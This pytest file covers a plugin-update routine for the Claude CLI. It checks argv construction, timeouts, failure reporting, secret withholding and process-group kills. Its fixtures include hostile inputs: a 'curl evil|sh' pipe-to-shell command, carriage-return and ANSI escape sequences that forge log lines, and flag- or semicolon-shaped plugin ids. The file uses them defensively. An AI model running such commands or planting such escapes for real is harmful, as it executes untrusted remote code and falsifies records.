"""#124. The plugin update, one operation with an outcome per plugin.

Every case here runs against an injected runner, so no test starts a real
agent. The runner records each argv and its timeout and answers from a table
keyed by the argv's tail, which is what lets a case say "the second update
fails" without knowing how the operation builds the call.
"""

from __future__ import annotations

import ast
import contextlib
import json
import os
import select
import signal
import subprocess
import sys
import time
from collections.abc import Callable
from pathlib import Path

import pytest

from hitchrail import claude_ipc
from hitchrail.claude_ipc import PluginOutcome, PluginsFailed, update_plugins

SRC = Path(__file__).parent.parent / "src" / "hitchrail"

REFRESH = ["claude", "plugin", "marketplace", "update"]
LISTING = ["claude", "plugin", "list", "--json"]


def update_argv(plugin_id: str) -> list[str]:
    return ["claude", "plugin", "update", plugin_id, "-s", "user", "-y", "--json"]


def row(plugin_id: str, scope: str = "user") -> dict[str, object]:
    """A listing row in the shape 2.1.280 prints, extra keys and all."""
    return {
        "id": plugin_id,
        "scope": scope,
        "version": "1.0.0",
        "enabled": True,
        "installPath": f"/var/cache/agent/plugins/{plugin_id}",
        "installedAt": "2026-09-01T00:00:00Z",
        "lastUpdated": "2026-09-01T00:00:00Z",
    }


Answer = subprocess.CompletedProcess[str] | BaseException


class FakeAgent:
    """Answers by argv. Unlisted calls succeed with no output."""

    def __init__(self, listing: object = (), **answers: Answer) -> None:
        self.calls: list[tuple[list[str], float]] = []
        self.answers: dict[str, Answer] = dict(answers)
        text = listing if isinstance(listing, str) else json.dumps(list(listing))  # type: ignore[call-overload]
        self.answers.setdefault("list", done(stdout=text))

    def __call__(self, argv: list[str], timeout: float) -> subprocess.CompletedProcess[str]:
        self.calls.append((argv, timeout))
        key = {
            "marketplace": "refresh",
            "list": "list",
        }.get(argv[2], argv[3] if argv[2] == "update" else argv[2])
        answer = self.answers.get(key, done())
        if isinstance(answer, BaseException):
            raise answer
        return answer

    @property
    def argvs(self) -> list[list[str]]:
        return [argv for argv, _ in self.calls]

    @property
    def updated(self) -> list[str]:
        return [argv[3] for argv in self.argvs if argv[2] == "update"]


def done(
    returncode: int = 0, stdout: str = "", stderr: str = ""
) -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess([], returncode, stdout, stderr)


def run(
    agent: FakeAgent, report: Callable[[PluginOutcome], None] | None = None
) -> list[PluginOutcome]:
    return update_plugins("claude", run=agent, report=report or (lambda _o: None))


def results(outcomes: list[PluginOutcome]) -> list[tuple[str, str, str]]:
    return [(o.plugin, o.scope, o.result) for o in outcomes]


# -- the argv, exactly -------------------------------------------------------


def test_the_calls_are_argument_lists_in_order() -> None:
    agent = FakeAgent([row("superpowers@x")])
    run(agent)
    assert agent.argvs == [REFRESH, LISTING, update_argv("superpowers@x")]


def test_every_call_has_a_finite_timeout() -> None:
    """Fails if 2 in the plan: a hung call must not hold the marker forever."""
    agent = FakeAgent([row("a@m"), row("b@m")])
    run(agent)
    assert agent.calls
    assert all(0 < timeout < float("inf") for _, timeout in agent.calls)


def test_the_binary_is_the_configured_one() -> None:
    agent = FakeAgent([row("a@m")])
    update_plugins("/opt/agent/bin/agent", run=agent, report=lambda _o: None)
    assert {argv[0] for argv in agent.argvs} == {"/opt/agent/bin/agent"}


# -- the ordinary run --------------------------------------------------------


def test_each_user_plugin_is_updated_once_in_listing_order() -> None:
    agent = FakeAgent([row("a@m"), row("b@m"), row("c@m")])
    outcomes = run(agent)
    assert agent.updated == ["a@m", "b@m", "c@m"]
    assert results(outcomes) == [
        ("a@m", "user", "updated"),
        ("b@m", "user", "updated"),
        ("c@m", "user", "updated"),
    ]


def test_each_outcome_is_reported_as_it_happens() -> None:
    """Part B streams these, so they must arrive one at a time, in order."""
    seen: list[str] = []
    agent = FakeAgent([row("a@m"), row("b@m")])

    def report(outcome: PluginOutcome) -> None:
        # By the time a plugin is reported, its own update has run and the
        # next one has not.
        seen.append(f"{outcome.plugin} after {len(agent.updated)}")

    run(agent, report)
    assert seen == ["a@m after 1", "b@m after 2"]


def test_no_plugins_is_an_empty_answer_not_a_failure() -> None:
    """A JSON list with nothing in it is a machine with no plugins."""
    agent = FakeAgent([])
    assert run(agent) == []
    assert agent.argvs == [REFRESH, LISTING]


# -- scopes -------------------------------------------------------------------


def test_other_scopes_are_counted_and_never_updated() -> None:
    """Fails if 3 in the plan. Six `local` rows are six projects' installs."""
    agent = FakeAgent(
        [
            row("a@m"),
            row("adapt@kit", "local"),
            row("adapt@kit", "local"),
            row("adapt@kit", "local"),
            row("cowork@synced", "synced"),
            row("b@m"),
        ]
    )
    outcomes = run(agent)
    assert agent.updated == ["a@m", "b@m"]
    assert all(argv[5] == "user" for argv in agent.argvs if argv[2] == "update")
    assert results(outcomes) == [
        ("a@m", "user", "updated"),
        ("adapt@kit", "local", "skipped"),
        ("adapt@kit", "local", "skipped"),
        ("adapt@kit", "local", "skipped"),
        ("cowork@synced", "synced", "skipped"),
        ("b@m", "user", "updated"),
    ]
    # #304: the reason a skipped row was skipped, which the same route shows
    # beside the plugin id; only the `result` tuple above was ever checked.
    assert outcomes[1].detail == "local scope is not updated"
    assert outcomes[4].detail == "synced scope is not updated"


def test_a_genuine_user_duplicate_is_updated_once_and_reported_as_skipped() -> None:
    """#300: dropping the repeat left the outcomes short of what the listing
    returned, so a duplicate is spawned once but still gets its own row, as
    `skipped`, and the count covers every row."""
    agent = FakeAgent([row("a@m"), row("b@m"), row("a@m")])
    outcomes = run(agent)
    assert agent.updated == ["a@m", "b@m"]
    assert results(outcomes) == [
        ("a@m", "user", "updated"),
        ("b@m", "user", "updated"),
        ("a@m", "user", "skipped"),
    ]
    assert outcomes[2].detail == "listed twice"


# -- one plugin fails ----------------------------------------------------------


def test_one_failure_does_not_stop_the_rest() -> None:
    agent = FakeAgent(
        [row("a@m"), row("b@m"), row("c@m"), row("d@m")],
        **{"b@m": done(1, stderr="fetch failed\nnetwork unreachable\n")},
    )
    outcomes = run(agent)
    assert agent.updated == ["a@m", "b@m", "c@m", "d@m"]
    assert results(outcomes) == [
        ("a@m", "user", "updated"),
        ("b@m", "user", "failed"),
        ("c@m", "user", "updated"),
        ("d@m", "user", "updated"),
    ]
    assert outcomes[1].detail == "exited 1: network unreachable"


def test_a_hung_update_is_a_failure_and_the_next_still_runs() -> None:
    agent = FakeAgent(
        [row("a@m"), row("b@m"), row("c@m")],
        **{"b@m": subprocess.TimeoutExpired(update_argv("b@m"), 1)},
    )
    outcomes = run(agent)
    assert agent.updated == ["a@m", "b@m", "c@m"]
    assert outcomes[1].result == "failed"
    assert outcomes[1].detail == "timed out"
    # #304: the timeout branch built its own `PluginOutcome` rather than
    # falling through to the one below, so nothing had checked it still
    # named the plugin that timed out and the scope it was updating.
    assert outcomes[1].plugin == "b@m"
    assert outcomes[1].scope == "user"


def test_a_failure_detail_is_bounded() -> None:
    """The vendor's stderr reaches a phone screen; a megabyte must not. The
    240 limit now bounds the vendor's own text (#305), so the escaped,
    marked result is a fixed, small amount longer, never unbounded."""
    agent = FakeAgent([row("a@m")], **{"a@m": done(2, stderr="x" * 10_000)})
    (outcome,) = run(agent)
    assert outcome.detail is not None
    assert len(outcome.detail) < 300
    assert outcome.detail.endswith("(truncated)")


def test_the_last_line_of_stdout_is_used_when_stderr_is_empty() -> None:
    """#304: `_detail` falls back to stdout only when stderr is empty; a
    survived mutant discarded stdout unconditionally in that case and always
    reported the bare exit code."""
    agent = FakeAgent([row("a@m")], **{"a@m": done(1, stderr="", stdout="first\nlast one")})
    (outcome,) = run(agent)
    assert outcome.detail == "exited 1: last one"


def test_no_output_at_all_still_reports_the_exit_code() -> None:
    """#304: with neither stream saying anything, the vendor's own words are
    genuinely absent, and that absence must not be papered over with a
    placeholder or crash the operation outright."""
    agent = FakeAgent([row("a@m")], **{"a@m": done(1, stderr="", stdout="")})
    (outcome,) = run(agent)
    assert outcome.detail == "exited 1"


def test_blank_lines_do_not_count_as_the_last_line() -> None:
    """#304: stderr with content that strips to nothing is the same absence
    as no stderr at all, not a line worth reporting."""
    agent = FakeAgent([row("a@m")], **{"a@m": done(1, stderr="\n   \n")})
    (outcome,) = run(agent)
    assert outcome.detail == "exited 1"


# -- the operation fails ---------------------------------------------------------


def test_a_failed_refresh_updates_nothing() -> None:
    agent = FakeAgent([row("a@m")], refresh=done(1, stderr="offline"))
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "marketplace_refresh_failed"
    # #304: `plugin_runs.py` reads `str(exc)` for the sentence a phone shows;
    # only `.code` was checked here, so the sentence itself could go missing
    # or drift and nothing would notice.
    assert str(caught.value) == (
        "the marketplaces could not be refreshed, so no plugin was updated: exited 1: offline"
    )
    assert agent.argvs == [REFRESH]


def test_a_hung_refresh_updates_nothing() -> None:
    agent = FakeAgent([row("a@m")], refresh=subprocess.TimeoutExpired(REFRESH, 1))
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "marketplace_refresh_failed"
    # #304: the same sentence, on the branch with no process to read a detail
    # from, so it ends in "timed out" rather than a `_detail(refresh)` call.
    assert str(caught.value) == (
        "the marketplaces could not be refreshed, so no plugin was updated: timed out"
    )
    assert agent.updated == []


@pytest.mark.parametrize(
    "listing",
    [
        "not json",
        "",
        json.dumps({"plugins": []}),
        json.dumps([{"name": "a"}]),
        json.dumps([{"id": 7, "scope": "user"}]),
        json.dumps([{"id": "a@m"}]),
        json.dumps(["a@m"]),
        # One good row beside a bad one is still a listing this code does not
        # understand: updating the subset it could parse is the fail open.
        json.dumps([row("a@m"), {"name": "b"}]),
        # Deep enough to blow the parser's own stack rather than raise
        # ValueError (#303): the listing is exactly as unreadable.
        "[" * 100_000,
    ],
    ids=[
        "text",
        "empty",
        "object",
        "no-id",
        "id-not-str",
        "no-scope",
        "strings",
        "one-bad-row",
        "deeply-nested",
    ],
)
def test_an_unreadable_listing_updates_nothing(listing: str) -> None:
    """Fails if 1 in the plan: never "0 updated" on a machine with plugins."""
    agent = FakeAgent(listing)
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "plugins_unreadable"
    # #304: as above, the sentence itself is what `plugin_runs.py` shows;
    # `.code` alone does not pin it.
    assert str(caught.value) == (
        "the installed plugin list could not be understood, so nothing was updated"
    )
    assert agent.updated == []


def test_a_listing_that_times_out_is_unreadable() -> None:
    agent = FakeAgent(list=subprocess.TimeoutExpired(LISTING, 1))
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "plugins_unreadable"
    assert agent.updated == []


def test_a_listing_that_exits_non_zero_is_unreadable() -> None:
    agent = FakeAgent(list=done(1, stdout="[]"))
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "plugins_unreadable"


@pytest.mark.parametrize(
    "plugin_id",
    # `a\n` because `$` would accept it: the anchors are `\A` and `\Z`.
    ["--help", "-s", "a b", "a;b", "", "a\nb", "a\n", "é@m", "a" * 300],
)
def test_a_hostile_id_makes_the_whole_listing_unreadable(plugin_id: str) -> None:
    """An argv element cannot become a flag, but a flag-shaped id is still a
    listing this code does not understand, and nothing is updated."""
    agent = FakeAgent([row("a@m"), row(plugin_id)])
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "plugins_unreadable"
    assert agent.updated == []


@pytest.mark.parametrize("scope", ["", "USER", "us er", "-s", "user\n", "x" * 100])
def test_a_hostile_scope_makes_the_listing_unreadable(scope: str) -> None:
    agent = FakeAgent([row("a@m", scope)])
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "plugins_unreadable"


@pytest.mark.parametrize("error", [FileNotFoundError(), PermissionError()])
def test_a_missing_agent_spawns_nothing_further(error: OSError) -> None:
    agent = FakeAgent([row("a@m")], refresh=error)
    with pytest.raises(PluginsFailed) as caught:
        run(agent)
    assert caught.value.code == "agent_missing"
    assert agent.argvs == [REFRESH]
    # #304: only `.code` was checked, so the message could name the wrong
    # argv element (the subcommand rather than the binary) or vanish
    # entirely and nothing here would notice.
    assert (
        str(caught.value)
        == f"'claude' could not be run, so nothing further was updated: {error}"
    )


def test_the_agent_vanishing_mid_run_is_agent_missing() -> None:
    """Uninstalled between the listing and an update: what ran is reported
    through `report`, and the operation fails rather than calling each
    remaining plugin `failed` with the same cause."""
    seen: list[PluginOutcome] = []
    agent = FakeAgent([row("a@m"), row("b@m"), row("c@m")], **{"b@m": FileNotFoundError()})
    with pytest.raises(PluginsFailed) as caught:
        run(agent, seen.append)
    assert caught.value.code == "agent_missing"
    assert [o.plugin for o in seen] == ["a@m"]
    assert agent.updated == ["a@m", "b@m"]


# -- what -y approved ----------------------------------------------------------


def test_the_command_y_approved_is_carried_in_the_outcome() -> None:
    line = json.dumps(
        {"shownCommand": {"command": "curl -s https://x/install", "sha256": "ab"}}
    )
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=f"{line}\n")})
    (outcome,) = run(agent)
    assert outcome.result == "updated"
    assert outcome.approved_command == "curl -s https://x/install"


@pytest.mark.parametrize(
    "stdout",
    [
        "",
        "Updated a@m to 1.2.0\n",
        "{not json",
        json.dumps({"shownCommand": 7}),
        json.dumps([1]),
        # Deep enough to blow the parser's own stack (#303), on a line of
        # the update's own `--json` output rather than the listing.
        "[" * 100_000,
    ],
)
def test_an_update_without_that_field_is_still_updated(stdout: str) -> None:
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=stdout)})
    (outcome,) = run(agent)
    assert outcome.result == "updated"
    assert outcome.approved_command is None


def test_a_malformed_line_does_not_stop_the_search_for_the_command() -> None:
    """#304: one line the vendor's `--json` output that does not parse is
    that line's own problem, not a reason to give up on every line after it,
    which a survived mutant did by turning the skip into a stop."""
    line = json.dumps(
        {"shownCommand": {"command": "curl -s https://x/install", "sha256": "ab"}}
    )
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=f"not json\n{line}\n")})
    (outcome,) = run(agent)
    assert outcome.approved_command == "curl -s https://x/install"


def test_an_empty_approved_command_is_treated_as_absent() -> None:
    """#304: `shownCommand.command` being present but empty is the same as
    it being absent, not a command worth carrying."""
    line = json.dumps({"shownCommand": {"command": "", "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command is None


def test_a_command_at_exactly_the_limit_is_not_marked_cut() -> None:
    """#304: `_shown`'s length check is inclusive of `_DETAIL_LIMIT`, so a
    command that exactly fills it is the whole vendor text, not a cut of it."""
    command = "a" * claude_ipc._DETAIL_LIMIT
    line = json.dumps({"shownCommand": {"command": command, "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command == command


# -- the real runner -------------------------------------------------------------


def test_the_real_runner_withholds_what_it_is_told_to(tmp_path: Path) -> None:
    """#113 for the plugin path. A marketplace's install command runs with
    this process's environment, and `-y` approves it unseen, so the token
    must not be in it."""
    runner = claude_ipc.plugin_runner(withhold=("HITCHRAIL_TEST_SECRET",))
    os.environ["HITCHRAIL_TEST_SECRET"] = "s3cret"
    try:
        result = runner(["env"], 10)
    finally:
        del os.environ["HITCHRAIL_TEST_SECRET"]
    assert "HITCHRAIL_TEST_SECRET" not in result.stdout
    assert "PATH=" in result.stdout


def test_the_real_runner_runs_in_the_home_directory() -> None:
    """Not wherever `hitchrail` happened to be started: the vendor resolves a
    project scope from the working directory, so the listing would otherwise
    depend on the operator's shell."""
    result = claude_ipc.plugin_runner(withhold=())(["pwd"], 10)
    assert result.stdout.strip() == str(Path.home())


def test_the_real_runner_gives_the_child_no_terminal_to_ask_on() -> None:
    """Under `hitchrail update-plugins` stdin is the operator's terminal, and
    a child that prompts on it would wait for an answer nobody expects to
    give. A closed stdin reads as end of file at once.

    #301: calling the runner directly here cannot tell an inherited stdin
    from a closed one, because pytest's own capture already points the TEST
    process's fd 0 at `/dev/null`; the previous version of this test passed
    with `stdin=subprocess.DEVNULL` removed from the runner. Run it through a
    HELPER process instead, whose own stdin is a pipe this test opens and
    never closes during the check: `cat` inheriting that open pipe would
    block past the runner's own timeout, where `cat` given a closed stdin
    exits at once regardless of what the pipe does.
    """
    script = (
        "from hitchrail import claude_ipc\n"
        "r = claude_ipc.plugin_runner(withhold=())(['cat'], 1.5)\n"
        "print(r.returncode)\n"
        "print(repr(r.stdout))\n"
    )
    with subprocess.Popen(
        [sys.executable, "-c", script],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        text=True,
    ) as helper:
        assert helper.stdout is not None
        # Never written to and never closed here: a write or a close would
        # deliver EOF to `cat` if it inherited this pipe, which is exactly
        # the false pass #301 found. Only the runner's own timeout may end
        # a `cat` that blocked on it.
        readable, _, _ = select.select([helper.stdout], [], [], 3)
        assert readable, "the helper produced nothing within the bound"
        first = helper.stdout.readline()
        second = helper.stdout.readline()
    assert first.strip() == "0", (
        f"cat did not exit as if given a closed stdin: {first!r}. Empty here "
        "means cat blocked on an inherited pipe until the runner's own "
        "timeout ended it (#301)."
    )
    assert second.strip() == "''", f"a failing command still captured output: {second!r}"


def test_the_real_runner_kills_a_hung_childs_own_children(tmp_path: Path) -> None:
    """#299. A marketplace's install command, approved unseen by `-y`, runs as
    the child's own child. `subprocess.run`'s timeout handling kills only the
    pid it started, so a hung install command would outlive the run being
    reported `failed: timed out`.

    A real grandchild, not an argv assertion: the gap is in what
    `subprocess.run` does after the call, which a fake runner cannot show.
    The child writes the grandchild's pid before it hangs, so this reads the
    OS's answer rather than trusting the runner's own report.

    #299's round 1 review (M1) found the previous version of this test passed
    for the wrong reason: the grandchild inherited the runner's own stdout and
    stderr pipes, so replacing `os.killpg` with `proc.kill()` left the
    grandchild alive holding them open, the reap's `communicate()` blocked on
    ITS exit rather than ending at the runner's own bound, and by the time
    this test's own check ran the grandchild had usually finished its whole 30
    second sleep and exited on its own, which `pidfd_open` raising
    `ProcessLookupError` then read as a pass. Redirected to `DEVNULL` here, so
    that path cannot happen, and the elapsed time assertion below is what a
    slow pass through the old bug cannot satisfy.
    """
    runner = claude_ipc.plugin_runner(withhold=())
    pid_file = tmp_path / "grandchild.pid"
    script = (
        "import subprocess, time\n"
        "p = subprocess.Popen(['sleep', '30'], stdout=subprocess.DEVNULL, "
        "stderr=subprocess.DEVNULL)\n"
        f"open({str(pid_file)!r}, 'w').write(str(p.pid))\n"
        "time.sleep(30)\n"
    )

    started = time.monotonic()
    with pytest.raises(subprocess.TimeoutExpired):
        runner([sys.executable, "-c", script], 0.5)
    elapsed = time.monotonic() - started
    assert elapsed < 5, f"the runner did not return near its 0.5s bound: {elapsed:.1f}s"

    grandchild_pid = int(pid_file.read_text())
    try:
        pidfd = os.pidfd_open(grandchild_pid)
    except ProcessLookupError:
        # Gone this soon after a 0.5s timeout, with a 30 second sleep and no
        # pipe left to block a slow pass on: nothing but the runner's own kill
        # explains its absence, which `elapsed` above already confirms.
        return
    try:
        exited = select.select([pidfd], [], [], 5)[0]
    finally:
        os.close(pidfd)
    assert exited, "the grandchild outlived the timeout: only the direct child was killed"


def test_the_real_runner_bounds_the_reap_past_a_grandchild_holding_the_pipes(
    tmp_path: Path,
) -> None:
    """#299 round 1 review (H1). A grandchild that leaves the process group,
    the shape a daemonising install hook or one that runs `setsid` itself
    takes, is untouched by `os.killpg` on the direct child's group, and if it
    also inherited the runner's stdout/stderr pipes, a second `communicate()`
    with no bound of its own would wait for THAT process's exit rather than
    the runner's. Measured before the fix: a grandchild sleeping 8 seconds
    made a 0.5 second bound return after 8.0 seconds, during which every
    caller saw the plugin run stuck `running`.
    """
    runner = claude_ipc.plugin_runner(withhold=())
    pid_file = tmp_path / "grandchild.pid"
    script = (
        "import subprocess, time\n"
        "p = subprocess.Popen(['sleep', '8'], start_new_session=True)\n"
        f"open({str(pid_file)!r}, 'w').write(str(p.pid))\n"
        "time.sleep(30)\n"
    )

    started = time.monotonic()
    with pytest.raises(subprocess.TimeoutExpired):
        runner([sys.executable, "-c", script], 0.5)
    elapsed = time.monotonic() - started
    assert elapsed < 5, f"the reap waited on a grandchild outside the group: {elapsed:.1f}s"

    # Cleanup: this grandchild started its own session, so the direct
    # child's group kill above never reached it, and it will otherwise
    # outlive this test for the rest of its 8 second sleep.
    grandchild_pid = int(pid_file.read_text())
    with contextlib.suppress(ProcessLookupError):
        os.kill(grandchild_pid, signal.SIGKILL)


class _FakeStream:
    """What `proc.stdout`/`proc.stderr` need to be for the reap after a kill:
    something `close()`able. The tmux sibling of this fake, in `test_tmux.py`,
    explains why."""

    def __init__(self) -> None:
        self.closed = False

    def close(self) -> None:
        self.closed = True


def test_the_real_runner_kills_the_group_on_any_exception_not_only_a_timeout(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """#299 round 1 review (M2). `subprocess.run`'s own timeout handling used
    to be `except: process.kill(); raise`, catching every exception, not only
    `TimeoutExpired`: a `SIGINT` on the operator's terminal while `claude
    plugin update ... -y` ran was also a kill. `run(timeout=)` narrowing that
    to `except subprocess.TimeoutExpired` when this runner moved off
    `subprocess.run` (#299) meant Ctrl-C during a real update left the child
    orphaned in its own session, unreachable by the terminal's own signal.

    A fake `Popen` whose `communicate` raises `KeyboardInterrupt`, the same
    shape a real SIGINT produces, proves the group is still killed and the
    reap still bounded for an exception that is not a timeout at all, which
    `test_the_real_runner_bounds_the_reap_past_a_grandchild_holding_the_pipes`
    and the hung-child test above, both driven by an actual 0.5s timeout,
    cannot exercise.
    """
    killed: list[tuple[int, int]] = []
    waited: list[float | None] = []

    class FakeProcess:
        pid = 4242
        returncode = -2
        stdout = _FakeStream()
        stderr = _FakeStream()

        def communicate(self, timeout: float | None = None) -> tuple[str, str]:
            raise KeyboardInterrupt

        def wait(self, timeout: float | None = None) -> int:
            waited.append(timeout)
            return self.returncode

    def fake_popen(*args: object, **kw: object) -> FakeProcess:
        return FakeProcess()

    monkeypatch.setattr(subprocess, "Popen", fake_popen)
    monkeypatch.setattr("os.killpg", lambda pgid, sig: killed.append((pgid, sig)))

    runner = claude_ipc.plugin_runner(withhold=())
    with pytest.raises(KeyboardInterrupt):
        runner(["claude", "plugin", "update"], 30.0)

    assert killed == [(4242, signal.SIGKILL)], (
        "an exception other than a timeout must still kill the group (M2)"
    )
    assert waited and all(isinstance(w, float) and 0 < w <= 5 for w in waited), (
        "the reap after the kill must stay bounded"
    )


# -- the quarantine ---------------------------------------------------------------


def _string_constants(path: Path) -> set[str]:
    """Every string literal in a module, docstrings and comments excluded.

    The structure, not a grep, for the reason [[guards fail on their own
    explanation]]: a text search for `"--json"` matches the comment that
    forbids it.
    """
    tree = ast.parse(path.read_text())
    docstrings = {
        id(node.body[0].value)
        for node in ast.walk(tree)
        if isinstance(node, ast.Module | ast.ClassDef | ast.FunctionDef | ast.AsyncFunctionDef)
        and node.body
        and isinstance(node.body[0], ast.Expr)
        and isinstance(node.body[0].value, ast.Constant)
    }
    return {
        node.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Constant)
        and isinstance(node.value, str)
        and id(node) not in docstrings
    }


def test_the_plugin_vocabulary_lives_only_in_the_quarantine() -> None:
    """Fails if 4 in the plan. `lint-imports` cannot see a string."""
    # `-s` is not in the set: tmux uses it for its own socket and session
    # flags, so it names nothing vendor specific outside this module.
    vocabulary = {"plugin", "marketplace", "--json", "-y", "shownCommand"}
    assert vocabulary <= _string_constants(SRC / "claude_ipc.py"), (
        "the quarantine no longer holds this vocabulary, so this guard checks nothing"
    )
    leaked = {
        p.name: sorted(vocabulary & _string_constants(p))
        for p in SRC.glob("*.py")
        if p.name != "claude_ipc.py" and vocabulary & _string_constants(p)
    }
    assert leaked == {}, f"plugin vocabulary outside the quarantine: {leaked}"


# -- vendor text is shown, never interpreted (round 1 review) -----------------

HOSTILE = "curl evil|sh\r\x1b[2Kharmless\nupdated  forged@x"


def test_an_approved_command_cannot_rewrite_the_line_that_records_it() -> None:
    """`-y` approved it unseen, so this is the only record of what ran. A
    carriage return and an erase-line sequence would print `harmless` over
    it, and a newline would forge a second outcome line."""
    line = json.dumps({"shownCommand": {"command": HOSTILE, "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command is not None
    assert not any(ch in outcome.approved_command for ch in "\r\n\x1b")
    assert outcome.approved_command.startswith("curl evil|sh")


def test_a_failure_detail_cannot_rewrite_its_line() -> None:
    """`_detail` keeps only the last line of stderr, and `str.splitlines()`
    also splits on `\r`, so `HOSTILE` never reaches the escaping: its last
    line is plain text. An ESC with no line break around it does reach it
    (#306)."""
    agent = FakeAgent([row("a@m")], **{"a@m": done(1, stderr="x \x1b[2Kharmless")})
    (outcome,) = run(agent)
    assert outcome.detail is not None
    assert "\x1b" not in outcome.detail


def test_the_cut_happens_before_the_escaping() -> None:
    """Escaping before the cut bounds the ESCAPED form, so a marketplace can
    pad its declared command with controls and push the payload out of the
    240 character budget six times sooner than an honest command would
    (#305): forty tabs escape to 240 characters on their own, leaving no
    room for the command that follows."""
    line = json.dumps({"shownCommand": {"command": "\t" * 40 + "curl evil|sh", "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command is not None
    assert "curl evil|sh" in outcome.approved_command


def test_the_cut_happens_before_the_escaping_when_the_command_is_cut() -> None:
    """The test above is 52 raw characters, so it never reaches the cut: an
    escape-before-cut in the cut branch alone passed it. 252 raw characters
    do, and the payload sits inside the first 240 of them but past the
    first 240 of their escaped form."""
    command = "\t" * 40 + "curl evil|sh" + "x" * 200
    line = json.dumps({"shownCommand": {"command": command, "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command is not None
    assert "curl evil|sh" in outcome.approved_command
    assert outcome.approved_command.endswith("(truncated)")


def test_a_command_over_the_limit_carries_the_cut_marker() -> None:
    """The cut now bounds the vendor's own text, so escaping a long run of
    controls can make the rendered line grow past 240; the marker is what
    says it was shortened at all."""
    line = json.dumps({"shownCommand": {"command": "\x1b" * 500, "sha256": "ab"}})
    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
    (outcome,) = run(agent)
    assert outcome.approved_command is not None
    assert outcome.approved_command.endswith("(truncated)")
    assert "\x1b" not in outcome.approved_command
